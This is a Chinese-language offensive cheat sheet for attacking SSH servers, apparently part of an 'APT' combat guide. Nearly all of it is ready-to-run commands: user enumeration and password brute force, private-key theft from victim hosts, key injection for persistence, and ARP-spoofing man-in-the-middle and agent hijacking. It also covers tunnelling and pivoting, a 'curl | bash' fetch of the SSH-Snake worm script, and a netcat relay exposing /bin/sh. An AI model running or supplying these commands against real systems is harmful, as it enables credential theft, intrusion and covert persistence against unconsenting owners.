# SSH服务

1.SSH服务器
+ [OpenSSH](http://www.openssh.org/)
+ [DropBear](https://matt.ucc.asn.au/dropbear/dropbear.html)
+ [Putty](https://www.chiark.greenend.org.uk/~sgtatham/putty/)
+ [CopSSH](https://www.itefix.net/copssh)

2.Banner
```bash
nc -vn <IP> 22
```

3.用户名枚举
```bash
msf> use scanner/ssh/ssh_enumusers
```

4.暴力破解

[默认字典](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%9B%9B%E7%AB%A0/SSH/ssh-betterdefaultpasslist.txt)

[20个最常用的](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%9B%9B%E7%AB%A0/SSH/top-20-common-SSH-passwords.txt)

5.私钥暴力破解

[nmap](https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html)
```bash
nmap -p 22 --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}"  <target>
nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "user"}, publickeys={"./id_rsa1.pub", "./id_rsa2.pub"}'  <target>

响应
22/tcp open  ssh     syn-ack
| ssh-publickey-acceptance:
|   Accepted Public Keys:
|_    Key ./id_rsa1 accepted for user root
```

Metasploit
```bash
msf> use scanner/ssh/ssh_identify_pubkeys
```

Badkeys

[静态SSH密钥用于主机和身份验证，已应用于软件和硬件产品中](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%9B%9B%E7%AB%A0/SSH/Authorized)

Debian OpenSSL 可预测 PRNG

[debian-ssh](https://github.com/g0tmi1k/debian-ssh)

工具

[ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)

## 密钥

### 密钥窃取

Metasploit
```bash
run post/multi/gather/ssh_creds
```

Bash
```bash
受害者主机
find / -name ".ssh" 2>/dev/null
tar -czvf </.ssh/path>

攻击者主机：
ssh -i <stolen_private_key> <username>@<target_ip>
```

meterpreter
```bash
use auxiliary/scanner/ssh/ssh_login_pubkey
set rhosts <IP>
set key_path /root/.msf4/loot/id_rsa
set username <username>
exploit
sessions
session <id>
```

### 公钥注入

```bash
ssh-keygen -t rsa -b 2048 -C "邮箱"
ssh-copy-id -oHostKeyAlgorithms=+ssh-rsa -i .ssh/id_rsa.pub user@hostname
ssh -oHostKeyAlgorithms=+ssh-rsa -i .ssh/id_rsa user@hostname
```

Metasploit
```bash
run post/linux/manage/sshkey_persistence
```

### 弱秘钥

服务器
```bash
ssh-keygen -t rsa -b 512 -C "邮箱"
```

因数分解工具

[Yafu](https://github.com/bbuhrow/yafu)

[Msieve](https://github.com/radii/msieve)

弱秘钥及算法检测
```bash
nmap -p22 <ip> --script ssh2-enum-algos
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full
```

ssh-audit
```bash
apt install ssh-audit
ssh-audit <IP>
```

暴力破解
```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/字典文件 id_rsa.hash
```

## SSH中间人

### 流量重定向

```bash
tcpdump -i any -n -vv -s 0 -c 100 -W 100 port 22
echo 1 > /proc/sys/net/ipv4/ip_forward
ettercap -i eth0 -T -q -M arp:remote /受害者主机// /攻击者主机//
```

### 命令执行中继

```bash
ettercap -T -M arp:remote /受害者IP地址// /网关IP地址//
echo 1 > /proc/sys/net/ipv4/ip_forward
ssh -i /私钥文件 SSH服务器地址 "系统命令"
```

### 密钥交换

```bash
sshmitm -p 2222 <目标服务器IP地址>
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
ssh-keygen -p <攻击者密钥> -o <共享秘钥>
ssh -o "KexAlgorithms=diffie-hellman-group-exchange-sha256" -i <共享秘钥路径> <SSH主机IP地址>
```

### 代理劫持

```bash
ssh-agent -a <SSH服务地址>
eval $(ssh-agent)
ssh-add .ssh/id_rsa
find / -name 'ssh-agent*' #/usr/lib/systemd/user/ssh-agent.service
export SSH_AUTH_SOCK=/usr/lib/systemd/user/ssh-agent.service
ssh-add -l
ssh -i <私钥文件> <SSH服务器IP>
```

```bash
ssh-keyscan -p 22 <SSH服务器地址>
ssh-keygen -y -f <.ssh/id_rsa>
```

## SSH隧道

### 动态SSH隧道

攻击者主机
```bash
ssh -D 1080 -C -N 用户名@SSH服务器
apt install tsocks
```

vim /etc/tsocks.conf
```bash
server = 127.0.0.1
server_port = 1080
```

```bash
tsocks ssh 用户名@SSH客户端
```

### 本地SSH隧道

攻击者主机
```bash
ssh -L 本地端口:目标服务器IP:目标端口 用户名@SSH服务器
ssh 用户名@127.0.0.1 -p <本地监听端口>
```

### 远程SSH隧道

SSH服务器
```bash
ssh -R 远程端口:客户端IP:客户端端口 用户名@攻击者SSH服务器 -N
```

攻击者主机
```bash
ssh 用户名@127.0.0.1 -p 远程端口
```

## SSH枢轴

逐一连接
```bash
ssh 192.168.8.175 --> ssh 192.168.1.7
```

### SSH-Snake

[SSH-Snake](https://github.com/MegaManSec/SSH-Snake)
```bash
wget https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh
bash ./Snake.nocomments.sh
```

无文件
```bash
curl https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh | bash
```

Metasploit
```bash
use auxiliary/scanner/ssh/ssh_login
exploit
sessions -u <会话ID>

meterpreter
run autoroute -s
        or
run post/multi/manage/autoroute

background
use auxiliary/scanner/ssh/ssh_login
exploit
```

## 端口中继

SSH服务器
```bash
iptables -A INPUT -s 攻击者IP -p tcp --dport 22 -j DROP
iptables -I INPUT 1 -s 攻击者IP -p tcp --dport 4444 -j ACCEPT
nc -l -p 4444 | nc <SSH服务器IP地址> 22
```

攻击者主机
```bash
ncat <SSH服务器IP地址> 4444
```

FIFO
```bash
SSH服务器
mknod /tmp/backpipe p
ncat -lvp 4444 -e /bin/sh 0</tmp/backpipe | nc <SSH服务器IP地址> 22 1>/tmp/backpipe

攻击者主机
ncat <SSH服务器IP地址> 4444
```
